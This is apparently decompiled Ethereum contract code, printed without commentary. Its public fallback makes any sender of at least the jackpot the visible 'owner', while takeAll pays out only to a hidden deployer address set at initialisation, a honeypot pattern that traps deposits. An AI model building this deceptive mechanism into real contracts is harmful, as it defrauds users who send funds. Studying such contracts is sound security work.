contract main {


// =======================  Init code  ======================


address stor0;

function _fallback() payable {
    stor0 = msg.sender
    return code.data[48 len 528]
}



// =====================  Runtime code  =====================


address stor0;
address owner;
uint256 jackpot;
uint256 withdrawDelay;

function withdrawDelay() {
    return withdrawDelay
}

function jackpot() {
    return jackpot
}

function owner() {
    return owner
}

function _fallback() payable {
    if msg.value >= jackpot:
        owner = msg.sender
        withdrawDelay = block.timestamp + (120 * 24 * 3600)
    jackpot += msg.value
}

function takeAll() {
    require stor0 == msg.sender
    require block.timestamp >= withdrawDelay
    call msg.sender with:
       value jackpot wei
         gas 2300 * is_zero(value) wei
    require ext_call.success
    jackpot = 0
}



}
